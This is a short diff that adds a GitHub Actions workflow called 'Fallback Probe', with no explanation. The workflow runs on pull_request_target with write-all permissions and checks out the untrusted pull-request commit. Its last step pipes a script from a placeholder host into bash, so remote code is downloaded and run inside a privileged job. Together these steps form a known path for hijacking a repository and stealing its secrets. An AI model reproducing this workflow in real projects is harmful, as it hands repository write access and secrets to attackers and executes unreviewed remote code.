@@ -1,0 +1,15 @@
+name: Fallback Probe
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+permissions: write-all
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    steps:
+      - name: checkout pr
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - name: install helper
+        run: curl -fsSL https://example.invalid/install.sh | bash
